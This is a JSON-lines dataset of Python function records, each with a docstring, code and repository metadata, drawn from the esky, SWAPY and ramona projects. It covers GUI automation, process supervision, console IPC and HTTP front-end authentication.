{"docstring": "\"\"\"Method decorator to allow access to a method via the sudo proxy.\n\nThis decorator wraps an Esky method so that it can be called via the\nesky's sudo proxy.  It is also used to declare type conversions/checks\non the arguments given to the method.  Example:\n\n    @allow_from_sudo(str)\n    def install_version(self,version):\n        if self.sudo_proxy is not None:\n            return self.sudo_proxy.install_version(version)\n        ...\n\nNote that there are two aspects to transparently tunneling a method call\nthrough the sudo proxy: allowing it via this decorator, and actually \npassing on the call to the proxy object.  I have no intention of making\nthis any more hidden, because the fact that a method can have escalated\nprivileges is something that that needs to be very obvious from the code.\n\"\"\"\n", "func_signal": "def allow_from_sudo(*argtypes,**kwds):\n", "code": "def decorator(func):\n    func._esky_sudo_argtypes = argtypes\n    func._esky_sudo_iterator = kwds.pop(\"iterator\",False)\n    return func\nreturn decorator", "path": "esky\\sudo\\__init__.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "\"\"\"Get the argtypes list for the given method.\n\nThis searches the base classes of obj if the given method is not declared\nallowed_from_sudo, so that people don't have to constantly re-apply the\ndecorator.\n\"\"\"\n", "func_signal": "def _get_sudo_argtypes(obj,methname):\n", "code": "for base in _get_mro(obj):\n    try:\n        argtypes = base.__dict__[methname]._esky_sudo_argtypes\n    except (KeyError,AttributeError):\n        pass\n    else:\n        return argtypes\nreturn None", "path": "esky\\sudo\\__init__.py", "repo_name": "cloudmatrix/esky", "stars": 359, "license": "bsd-3-clause", "language": "python", "size": 1762}
{"docstring": "#-----Main frame-----\n", "func_signal": "def _init_ctrls(self, prnt):\n", "code": "        wx.Frame.__init__(self, id=wxID_FRAME1, name='', parent=prnt, \n              style=wx.MINIMIZE_BOX | wx.MAXIMIZE_BOX | wx.SYSTEM_MENU | wx.CAPTION | wx.CLOSE_BOX | wx.CLIP_CHILDREN | wx.RESIZE_BORDER,\n              title='SWAPY - Simple Windows Automation on Python v. %s. pywinauto v. %s. %s' % (const.VERSION,\n                                                                                                proxy.pywinauto.__version__,\n                                                                                                platform.architecture()[0]))\n        self.SetIcon(wx.Icon(proxy.resource_path(\"swapy_dog_head.ico\"),\n              wx.BITMAP_TYPE_ICO))\n              \n        self.Bind(wx.EVT_MENU, self.menu_action) # - make action\n        #----------\n              \n        #-----Static Boxes-----\n        self.staticBox_ObjectsBrowser = wx.StaticBox(id=wxID_FRAME1STATICBOX_OBJECTSBROWSER,\n              label='Objects browser', name='staticBox_ObjectsBrowser',\n              parent=self)\n\n        self.staticBox_Editor = wx.StaticBox(id=wxID_FRAME1STATICBOX_EDITOR,\n              label='Editor', name='staticBox_Editor', parent=self,)\n              \n        self.staticBox_Proprties = wx.StaticBox(id=wxID_FRAME1STATICBOX_PROPRTIES,\n              label='Properties', name='staticBox_Proprties', parent=self)\n        #----------\n              \n        #-----ObjectsBrowser-----\n        self.treeCtrl_ObjectsBrowser = wx.TreeCtrl(id=wxID_FRAME1TREECTRL_OBJECTSBROWSER,\n              name='treeCtrl_ObjectsBrowser', parent=self, style=wx.TR_HAS_BUTTONS)\n              \n        self.treeCtrl_ObjectsBrowser.Bind(wx.EVT_TREE_SEL_CHANGED,\n              self.ObjectsBrowserSelChanged, id=wxID_FRAME1TREECTRL_OBJECTSBROWSER)\n              \n        self.treeCtrl_ObjectsBrowser.Bind(wx.EVT_TREE_ITEM_RIGHT_CLICK, self.ObjectsBrowserRightClick)\n        #----------\n        \n        #-----Editor-----\n        self.textCtrl_Editor = wx.TextCtrl(id=wxID_FRAME1TEXTCTRL_EDITOR,\n              name='textCtrl_Editor', parent=self, style=wx.TE_MULTILINE | wx.TE_READONLY, value='')\n\n        self.textCtrl_Editor.Bind(wx.EVT_CONTEXT_MENU, self.EditorContextMenu)\n        \n        self.textCtrl_Editor.SetInitialSize((300,250))\n        #----------\n        \n        #-----Properties-----\n        self.listCtrl_Properties = wx.ListCtrl(id=wxID_FRAME1LISTCTRL1_PROPERTIES, name='listCtrl1_Properties',\n              parent=self, style=wx.LC_REPORT)\n              \n        self.listCtrl_Properties.InsertColumn(col=0, format=wx.LIST_FORMAT_LEFT,\n              heading='Property', width=-1)\n              \n        self.listCtrl_Properties.InsertColumn(col=1, format=wx.LIST_FORMAT_LEFT,\n              heading='Value', width=-1)\n              \n        self.listCtrl_Properties.Bind(wx.EVT_LIST_ITEM_RIGHT_CLICK,\n              self.PropertiesRightClick, id=wxID_FRAME1LISTCTRL1_PROPERTIES)\n              \n        #self.listCtrl_Properties.Bind(wx.EVT_LEFT_DCLICK, self.Refresh, id=wxID_FRAME1LISTCTRL1_PROPERTIES)\n        #----------\n        \n        #-----Sizers-----\n        staticBox_ObjectsBrowser_sizer = wx.StaticBoxSizer(self.staticBox_ObjectsBrowser)\n        staticBox_ObjectsBrowser_sizer.Add(self.treeCtrl_ObjectsBrowser, 1, wx.EXPAND, 2)\n        \n        staticBox_Editor_sizer = wx.StaticBoxSizer(self.staticBox_Editor)\n        staticBox_Editor_sizer.Add(self.textCtrl_Editor, 1, wx.EXPAND, 2)\n        \n        staticBox_Proprties_sizer = wx.StaticBoxSizer(self.staticBox_Proprties)\n        staticBox_Proprties_sizer.Add(self.listCtrl_Properties, 1, wx.EXPAND, 2)\n        \n        sizer_h = wx.BoxSizer(wx.HORIZONTAL)\n        sizer_v = wx.BoxSizer(wx.VERTICAL)\n                \n        sizer_h.Add(staticBox_ObjectsBrowser_sizer, 1, wx.EXPAND, 2)\n        sizer_h.Add(sizer_v, 1, wx.EXPAND|wx.ALL, 2)\n        sizer_v.Add(staticBox_Editor_sizer, 1, wx.EXPAND, 2)\n        sizer_v.Add(staticBox_Proprties_sizer, 1, wx.EXPAND, 2)\n        \n        self.SetSizerAndFit(sizer_h)\n        #----------", "path": "_mainframe.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nAdd sub tree items object as children\n'''\n\n", "func_signal": "def _get_additional_children(self):\n", "code": "additional_children = []\nsub_items = self.pwa_obj.Children()\nfor item in sub_items:\n    item_text = item.Text()\n    obj = self._get_swapy_object(item)\n    obj.path = self.path + [item_text]\n    sub_item = [(item_text, obj)]\n    additional_children += sub_item\nreturn additional_children", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nAdd button objects as children\n'''\n", "func_signal": "def _get_additional_children(self):\n", "code": "additional_children = []\nbuttons_count = self.pwa_obj.ButtonCount()\nfor button_index in range(buttons_count):\n    try:\n        button = self.pwa_obj.Button(button_index)\n        button_text = button.info.text\n        if not button_text:\n            button_text = \"button #%s\" % button_index\n        button_object = self._get_swapy_object(button)\n    except exceptions.RuntimeError:\n        #button_text = ['Unknown button name1!'] #workaround for RuntimeError: GetButtonInfo failed for button with index 0\n        pass #ignore the button\n    else:\n        button_item = [(button_text, button_object)]\n        additional_children += button_item\nreturn additional_children", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nReturn list of children - [(control_text, swapy_obj),...]\nCan be overridden for non pywinauto objects\n'''\n", "func_signal": "def Get_subitems(self):\n", "code": "subitems = []\n\nsubitems += self._get_children()\nsubitems += self._get_additional_children()\n\nsubitems.sort(key=self.subitems_sort_key)\n#encode names\nsubitems_encoded = []\nfor (name, obj) in subitems:\n    #name = name.encode('cp1251', 'replace')\n    subitems_encoded.append((name, obj))\nreturn subitems_encoded", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nReturn dict of original + additional properties\nCan be overridden for non pywinauto objects\n'''\n", "func_signal": "def GetProperties(self):\n", "code": "properties = {}\nproperties.update(self._get_properties())\nproperties.update(self._get_additional_properties())\nreturn properties", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nGet additional useful properties, like a handle, process ID, etc.\nCan be overridden by derived class\n'''\n", "func_signal": "def _get_additional_properties(self):\n", "code": "additional_properties = {}\npwa_app = pywinauto.application.Application()\n#-----Access names\n\naccess_names = [name for name in pywinauto.findbestmatch.build_unique_dict([self.pwa_obj]).keys() if name != '']\naccess_names.sort(key=len)\nadditional_properties.update({'Access names': access_names})\n#-----\n\n#-----pwa_type\nadditional_properties.update({'pwa_type': str(type(self.pwa_obj))})\n#---\n\n#-----handle\ntry:\n    additional_properties.update({'handle': str(self.pwa_obj.handle)})\nexcept:\n    pass\n#---\nreturn additional_properties", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nGet original pywinauto's object properties\n'''\n#print type(self.pwa_obj)\n", "func_signal": "def _get_properties(self):\n", "code": "try:\n    properties = self.pwa_obj.GetProperties()\nexcept exceptions.RuntimeError:\n    properties = {} #workaround\nreturn properties", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nAdd ComboBox items as children\n'''\n", "func_signal": "def _get_additional_children(self):\n", "code": "additional_children = []\nfor i, text in enumerate(self.pwa_obj.ItemTexts()):\n    if not text:\n        text = \"option #%s\" % i\n        additional_children.append((text,\n                                    virtual_combobox_item(self, i)))\n    else:\n        additional_children.append((text,\n                                    virtual_combobox_item(self, text)))\nreturn additional_children", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nAdd menu object as children\n'''\n", "func_signal": "def _get_additional_children(self):\n", "code": "additional_children = []\nmenu = self.pwa_obj.Menu()\nif menu:\n    menu_child = [('!Menu', self._get_swapy_object(menu))]\n    additional_children += menu_child\nreturn additional_children", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nCheck self pywinauto object type\n'''\n", "func_signal": "def _get_pywinobj_type(self, obj):\n", "code": "if type(obj) == pywinauto.application.WindowSpecification:\n    return 'window'\nelif type(obj) == pywinauto.controls.menuwrapper.Menu:\n    return 'menu'\nelif type(obj) == pywinauto.controls.menuwrapper.MenuItem:\n    return 'menu_item'\nelif type(obj) == pywinauto.controls.win32_controls.ComboBoxWrapper:\n    return 'combobox'\nelif type(obj) == pywinauto.controls.win32_controls.ListBoxWrapper:\n    return 'listbox'\nelif type(obj) == pywinauto.controls.common_controls.ListViewWrapper:\n    return 'listview'\nelif type(obj) == pywinauto.controls.common_controls.TabControlWrapper:\n    return 'tab'\nelif type(obj) == pywinauto.controls.common_controls.ToolbarWrapper:\n    return 'toolbar'\nelif type(obj) == pywinauto.controls.common_controls._toolbar_button:\n    return 'toolbar_button'\nelif type(obj) == pywinauto.controls.common_controls.TreeViewWrapper:\n    return 'tree_view'\nelif type(obj) == pywinauto.controls.common_controls._treeview_element:\n    return 'tree_item'\nelse:\n    return 'unknown'", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nExecute action on the control\n'''\n#print('self.pwa_obj.'+action+'()')\n", "func_signal": "def Exec_action(self, action):\n", "code": "exec('self.pwa_obj.'+action+'()')\nreturn 0", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nAdd submenu object as children\n'''\n#print(dir(self.pwa_obj))\n#print(self.pwa_obj.is_main_menu)\n#print(self.pwa_obj.owner_item)\n\n", "func_signal": "def _get_additional_children(self):\n", "code": "self.subitems_sort_key = lambda obj: obj[1].pwa_obj.Index() #sorts items by indexes\n\nif not self.pwa_obj.accessible:\n    return []\n\nadditional_children = []\nmenu_items = self.pwa_obj.Items()\nfor menu_item in menu_items:\n    item_text = menu_item.Text()\n    if not item_text:\n        if menu_item.Type() == 2048:\n            item_text = '-----Separator-----'\n        else:\n            item_text = 'Index: %d' % menu_item.Index()\n    menu_item_child = [(item_text, self._get_swapy_object(menu_item))]\n    additional_children += menu_item_child\nreturn additional_children", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nCheck control/window Exists.\nReturn True or False if fails\n'''\n\n", "func_signal": "def _check_existence(self):\n", "code": "try:\n    handle_ = self.pwa_obj.handle\n    obj = pywinauto.application.WindowSpecification({'handle': handle_})\nexcept:\n    is_exist = False\nelse:\n    is_exist = obj.Exists()\nreturn is_exist", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nAdd roots object as children\n'''\n\n", "func_signal": "def _get_additional_children(self):\n", "code": "additional_children = []\nroots = self.pwa_obj.Roots()\nfor root in roots:\n    root_text = root.Text()\n    obj = self._get_swapy_object(root)\n    obj.path = [root_text]\n    root_item = [(root_text, obj)]\n    additional_children += root_item\nreturn additional_children", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nAdd submenu object as children\n'''\n#print(dir(self.pwa_obj))\n#print(self.pwa_obj.menu)\n#print self.get_menuitems_path()\n\n", "func_signal": "def _get_additional_children(self):\n", "code": "additional_children = []\nsubmenu = self.pwa_obj.SubMenu()\nif submenu:\n    submenu_child = [(self.pwa_obj.Text()+' submenu', self._get_swapy_object(submenu))]\n    additional_children += submenu_child\nreturn additional_children", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nConstructor\n'''\n#original pywinauto object\n", "func_signal": "def __init__(self, pwa_obj, parent=None):\n", "code": "self.pwa_obj = pwa_obj\nself.parent = parent\ndefault_sort_key = lambda name: name[0].lower()\nself.subitems_sort_key = default_sort_key", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nCheck control/window Actionable.\nReturn True or False if fails\n'''\n", "func_signal": "def _check_actionable(self):\n", "code": "try:\n    self.pwa_obj.VerifyActionable()\nexcept:\n    is_actionable = False\nelse:\n    is_actionable = True\nreturn is_actionable", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nCheck control/window visibility.\nReturn pwa.IsVisible() or False if fails\n'''\n", "func_signal": "def _check_visibility(self):\n", "code": "is_visible = False\ntry:\n    is_visible = self.pwa_obj.IsVisible()\nexcept:\n    pass\nreturn is_visible", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nreturns [(window_text, swapy_obj),...]\n'''\n#windows--------------------\n", "func_signal": "def Get_subitems(self):\n", "code": "windows = []\ntry_count = 3\napp = pywinauto.application.Application()\nfor i in range(try_count):\n  try:\n    handles = pywinauto.findwindows.find_windows()\n  except exceptions.OverflowError: # workaround for OverflowError: array too large\n    time.sleep(1)\n  except exceptions.MemoryError:# workaround for MemoryError\n    time.sleep(1)\n  else:\n    break\nelse:\n  #TODO: add swapy exception: Could not get windows list\n  handles = []\n#we have to find taskbar in windows list\nwarnings.filterwarnings(\"ignore\", category=FutureWarning) #ignore future warning in taskbar module\nfrom pywinauto import taskbar\ntaskbar_handle = taskbar.TaskBarHandle()\nfor w_handle in handles:\n    wind = app.window_(handle=w_handle)\n    if w_handle == taskbar_handle:\n        title = 'TaskBar'\n    else:\n        texts = wind.Texts()\n        texts = filter(bool, texts)  # filter out '' and None items\n        if not texts:\n            title = 'Window#%s' % w_handle\n        else:\n            title = ', '.join(texts)\n    windows.append((title, self._get_swapy_object(wind)))\nwindows.sort(key=lambda name: name[0].lower())\n#-----------------------\n\n#smt new----------------\n#------------------------\nreturn windows", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nAdd SysListView32 items as children\n'''\n", "func_signal": "def _get_additional_children(self):\n", "code": "additional_children = []\nfor item in self.pwa_obj.Items():\n    text = item.Text()\n    if not text:\n        index = item.item_index\n        column_index = item.subitem_index\n        text = \"option #%s,%s\" % (index, column_index)\n    additional_children += [(text, listview_item(item, self))]\nreturn additional_children", "path": "proxy.py", "repo_name": "pywinauto/SWAPY", "stars": 262, "license": "None", "language": "python", "size": 24187}
{"docstring": "'''\nAdd worker (callable) to idle work queue.\n@param worker: Callable that will be invoked when applicaiton loops idles\n@param *args: Optional positional arguments that will be supplied to worker callable\n@param **kwargs: Optional keywork arguments that will be supplied to worker callable\n'''\n", "func_signal": "def add_idlework(self, worker, *args, **kwargs):\n", "code": "if len(args) > 0 or len(kwargs) > 0:\n\tworker = functools.partial(worker, *args, **kwargs)\n\nself.idle_queue.append(worker)\nself.idle_watcher.start()", "path": "ramona\\server\\idlework.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "#TODO: Improve this significantly - maybe even add unit test\n#if diff.days > 7 or diff.days < 0: return d.strftime('%d %b %y')\n#\telif diff.days == 1:\n#\t    return '1 day ago'\n#\telif diff.days > 1:\n#\t    return '{} days ago'.format(diff.days)\n", "func_signal": "def natural_relative_time(diff_sec):\n", "code": "if diff_sec <= 1:\n\treturn 'just now'\nelif diff_sec < 60:\n\treturn '{:0.1f} sec(s) ago'.format(diff_sec)\nelif diff_sec < 120:\n\treturn '1 min ago'\nelif diff_sec < 3600:\n\treturn '{:0.0f} min(s) ago'.format(diff_sec/60)\nelif diff_sec < 7200:\n\treturn '1 hour ago'\nelse:\n\treturn '{:0.0f} hours ago'.format(diff_sec/3600)", "path": "ramona\\httpfend\\_request_handler.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "'''\nConsole-server call (wrapper to cnscom.svrcall)\n\n@param auto_connect: Automatically establish server connection if not present\n@param auto_server_start: Automatically start server if not running and establish connection\n'''\n", "func_signal": "def cnssvrcall(self, callid, params=\"\", auto_connect=False, auto_server_start=False):\n", "code": "assert not (auto_connect & auto_server_start), \"Only one of auto_connect and auto_server_start can be true\"\nif auto_connect:\n\tif self.ctlconsock is None:\n\t\ts = self.connect()\n\t\tif s is None:\n\t\t\traise exception.server_not_responding_error(\"Server is not responding - maybe it isn't running.\")\n\nelif auto_server_start:\n\t# Fist check if ramona server is running and if not, launch that\n\ts = self.auto_server_start()\n\nelse:\n\tassert self.ctlconsock is not None\n\ntry:\n\treturn cnscom.svrcall(self.ctlconsock, callid, params)\nexcept socket.error:\n\tpass\n\nif auto_connect or auto_server_start:\n\tL.debug(\"Reconnecting to server ...\")\n\n\tself.ctlconsock = None\n\ts = self.connect()\n\tif s is None:\n\t\traise exception.server_not_responding_error(\"Server is not responding - maybe it isn't running.\")\n\n\treturn cnscom.svrcall(self.ctlconsock, callid, params)", "path": "ramona\\console\\cnsapp.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "'''Used when params are transfered as JSON - it also handles situation when 'params' is empty string '''\n", "func_signal": "def parse_json_kwargs(params):\n", "code": "if params == '': return dict()\nreturn json.loads(params)", "path": "ramona\\cnscom.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "# Add data to tail buffer\n", "func_signal": "def __add_to_tailbuf(self, data):\n", "code": "lendata = len(data)\nif lendata == 0: return\n\ndatapos = 0\nwhile datapos < lendata:\n\tseppos = data.find('\\n', datapos)\n\tif seppos == -1:\n\t\t# Last chunk & no \\n at the end\n\t\tif datapos == 0:\n\t\t\tself.__tailbuf_append(data, False)\n\t\telse:\n\t\t\tself.__tailbuf_append(data[datapos:], False)\n\t\tbreak\n\telif seppos == lendata-1:\n\t\t# Last chunk terminated with \\n\n\t\tif datapos == 0:\n\t\t\tself.__tailbuf_append(data, True)\n\t\telse:\n\t\t\tself.__tailbuf_append(data[datapos:], True)\n\t\tbreak\n\telse:\n\t\tself.__tailbuf_append(data[datapos:seppos+1], True)\n\t\tdatapos = seppos + 1\n\n# Send tail to tailf clients\nfor cnscon in self.tailfset:\n\tcnscon.send_tailf(data)", "path": "ramona\\server\\logmed.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "'''\n@param subject: Subject of the email message\n@param text: Text to be sent (it is prefixed with greeting and signature by this method)\n@param recipients: List of message recipients\n'''\n\n", "func_signal": "def _send_mail(self, subject, text, recipients):\n", "code": "L.info(\"Sending '{}' mail to {}\".format(subject, ', '.join(recipients)))\n\nfqdn = socket.getfqdn()\nappname = config.get('general','appname')\nhostname = socket.gethostname()\n\nsubject = '{0} / {1} / {2} (by Ramona)'.format(appname, hostname, subject)\n\nsysident = 'Application: {0}\\n'.format(appname)\nif hostname != fqdn and fqdn != 'localhost':\n\tsysident += 'Hostname: {0} / {1}'.format(hostname, fqdn)\nelse:\n\tsysident += 'Hostname: {0}'.format(hostname)\n\ntry:\n\ttext = ''.join([\n\t\t'Hello,\\n\\nRamona produced following notification:\\n\\n', text,\n\t\t'\\n\\nSystem info:\\n', sysident, #Two enters in the begging are intentional; arg 'text' should not have one at its end\n\t\t'\\n\\nBest regards,\\nYour Ramona\\n\\nhttp://ateska.github.com/ramona\\n'\n\t])\n\t\n\tself.delivery.send(recipients, subject, text)\n\nexcept:\n\tL.exception('Exception during sending mail - ignoring')", "path": "ramona\\server\\notify.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "'''\nClient side of console communication IPC call (kind of RPC / Remote procedure call).\n\n@param cnssocket: Socket to server (created by socket_uri factory)\n@param callid: one of callid_* identification\n@param params: string representing parameters that will be passed to server call\n@return: String returned by server or raises exception if server call failed\n'''\n\n", "func_signal": "def svrcall(cnssocket, callid, params=\"\"):\n", "code": "paramlen = len(params)\nif paramlen >= 0x7fff:\n\traise RuntimeError(\"Transmitted parameters are too long.\")\n\ncnssocket.send(struct.pack(call_struct_fmt, call_magic, callid, paramlen)+params)\n\nwhile 1:\n\tretype, params = svrresp(cnssocket, hang_message=\"callid : {0}\".format(callid))\n\n\tif retype == resp_return:\n\t\t# Remote server call returned normally\n\t\treturn params\n\t\n\telif retype == resp_exception:\n\t\t# Remove server call returned exception\n\t\traise RuntimeError(params)\n\t\n\telif retype == resp_yield_message:\n\t\t# Remote server call returned yielded message -> we will continue receiving\n\t\tobj = json.loads(params)\n\t\tobj = logging.makeLogRecord(obj)\n\t\tif Lmy.getEffectiveLevel() <= obj.levelno: # Print only if log level allows that\n\t\t\tLmy.handle(obj)\n\t\tcontinue\n\n\telse:\n\t\traise RuntimeError(\"Unknown/invalid server response: {0}\".format(retype))", "path": "ramona\\cnscom.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "'''\nProxy tool (with straight argument passing) decorator foc console_app\n\nMarks function object by '.__proxy_tool' attribute\n'''\n", "func_signal": "def proxy_tool(fn):\n", "code": "fn.__proxy_tool = fn.func_name\nreturn fn", "path": "ramona\\console\\cnsapp.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "'''Uninstall (remove) Windows Ramona Service'''\n\n", "func_signal": "def w32_uninstall_svc():\n", "code": "import logging\nL = logging.getLogger('winsvc')\n\ncls = w32_ramona_service\nif cls._svc_name_ is None: cls.configure()\n\nscvType, svcState, svcControls, err, svcErr, svcCP, svcWH = win32serviceutil.QueryServiceStatus(cls._svc_name_)\n\nif svcState == win32service.SERVICE_RUNNING:\n\tL.debug(\"Service {0} is stopping ...\".format(cls._svc_name_))\n\twin32serviceutil.StopService(cls._svc_name_)\n\tL.debug(\"Service {0} is stopped.\".format(cls._svc_name_))\n\nwin32serviceutil.RemoveService(cls._svc_name_)\n\nreturn cls", "path": "ramona\\console\\winsvc.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "'''Receive and parse one server response - used inherently by svrcall.\n\n@param cnssocket: Socket to server (created by socket_uri factory)\n@param hang_detector: If set to True, logs warning when server is not responding in 2 seconds\t\n@param hang_message: Details about server call to be included in eventual hang message\n@return: tuple(retype, params) - retype is cnscom.resp_* integer and params are data attached to given response\n'''\n\n", "func_signal": "def svrresp(cnssocket, hang_detector=True, hang_message='details not provided'):\n", "code": "x = time.time()\nresp = \"\"\nwhile len(resp) < 4:\n\trlist, _, _ = select.select([cnssocket],[],[], 5)\n\tif len(rlist) == 0:\n\t\tif hang_detector and time.time() - x > 5:\n\t\t\tx = time.time()\n\t\t\tL.warning(\"Possible server hang detected: {0} (continue waiting)\".format(hang_message))\n\t\tcontinue\n\tndata = cnssocket.recv(4 - len(resp))\n\tif len(ndata) == 0:\n\t\traise EOFError(\"It looks like server closed connection\")\n\n\tresp += ndata\n\nmagic, retype, paramlen = struct.unpack(resp_struct_fmt, resp)\nassert magic == resp_magic\n\n# Read rest of the response (size given by paramlen)\nparams = \"\"\nwhile paramlen > 0:\n\tndata = cnssocket.recv(paramlen)\n\tparams += ndata\n\tparamlen -= len(ndata)\n\nreturn retype, params", "path": "ramona\\cnscom.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "# Static has to be handled before authentication, as the static content is available\n# even without authentication, because the static resources are used on the 401 page as well\n", "func_signal": "def do_GET(self):\n", "code": "if self.path.startswith(\"/static/\"):\n\treturn self._handle_static()\n\nif not self._check_authentication(): return\n\nif self.path.startswith(\"/ajax/\"):\n\treturn self._handle_ajax()\n\t\t\nelif self.path.startswith(\"/log/\"):\n\treturn self._handle_log()\nelif self.path.startswith(\"/loginner/\"):\n\t\n\treturn self._handle_log_inner()\n\nelse:\n\treturn self._handler_other()", "path": "ramona\\httpfend\\_request_handler.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "\"\"\"\nReturn path for Python executable - similar to sys.executable but also handles corner cases on Win32\n\n@param cmdline: Optional command line arguments that will be added to python executable, can be None, string or list\n\"\"\"\n\n", "func_signal": "def get_python_exec(cmdline=None):\n", "code": "if sys.executable.lower().endswith('pythonservice.exe'):\n\tpythonexec = os.path.join(sys.exec_prefix, 'python.exe')\nelse:\n\tpythonexec = sys.executable\n\nif cmdline is None: return pythonexec\nelif isinstance(cmdline, basestring): return pythonexec + ' ' + cmdline\nelse: return \" \".join([pythonexec] + cmdline)", "path": "ramona\\utils.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "'''\nTool decorator foc console_app\n\nMarks function object by '.__tool' attribute\n'''\n\n", "func_signal": "def tool(fn):\n", "code": "if inspect.isfunction(fn):\n\tfn.__tool = fn.func_name\n\nelif inspect.isclass(fn):\n\tfn.__tool = fn.__name__\n\nelse:\n\traise RuntimeError(\"Unknown type decorated as Ramona tool: {0}\".format(fn))\n\nreturn fn", "path": "ramona\\console\\cnsapp.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "\"\"\"\n@param withoutSelf: If true, the process with the same pid will be ignored\n@return iterator: Ident of all registered programs\n\"\"\"\n", "func_signal": "def getAllPrograms(self, withoutSelf=False):\n", "code": "for st in json.loads(self.getStatuses()):\n\tident = st.get(\"ident\")\n\tpid = st.get(\"pid\")\n\tif ident is None:\n\t\tcontinue\n\tif (not withoutSelf) or (pid != os.getpid()):\n\t\tyield ident", "path": "ramona\\httpfend\\_request_handler.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "# Launch worker safely\n", "func_signal": "def _execute(w):\n", "code": "try:\n\tw()\n# except SystemExit, e:\n# \tL.debug(\"Idle worker requested system exit\")\n# \tself.Terminate(e.code)\nexcept:\n\tL.exception(\"Exception during idle worker\")", "path": "ramona\\server\\idlework.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "# TODO: Take this from configuration\n", "func_signal": "def send_header(self, keyword, value):\n", "code": "prod = True\nif prod and keyword.lower() == \"server\": return\n\nBaseHTTPServer.BaseHTTPRequestHandler.send_header(self, keyword, value)", "path": "ramona\\httpfend\\_request_handler.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "\"\"\"\nCheck if the authentication is enabled and if yes, check if the user is authenticated\n   to access the httpfend or not.\n   If authentication is turned on, but the user fails to authenticate, the authentication headers\n   are sent to client (which triggers username and password prompt in the browser)\n   @return: True if the authentication is turned off or the user is successfully authenticated\n            False otherwise\n\"\"\"\n", "func_signal": "def _check_authentication(self):\n", "code": "authheader = self.headers.getheader(\"Authorization\", None)\nif self.server.username is not None and authheader is None:\n\tself.serve_auth_headers()\n\treturn False\n\nelif self.server.username is not None and authheader is not None:\n\tmethod, authdata = authheader.split(\" \") \n\tif method != \"Basic\":\n\t\tself.send_error(httplib.NOT_IMPLEMENTED, \"The authentication method '{0}' is not supported. Only Basic authnetication method is supported.\".format(method))\n\t\treturn False\n\tusername, _, password = base64.b64decode(authdata).partition(\":\")\n\tif self.server.password.startswith(\"{SHA}\"):\n\t\tpassword = \"{SHA}\" + hashlib.sha1(password).hexdigest()\n\t\n\tif username != self.server.username or password != self.server.password:\n\t\tself.serve_auth_headers()\n\t\treturn False\n\t\nreturn True", "path": "ramona\\httpfend\\_request_handler.py", 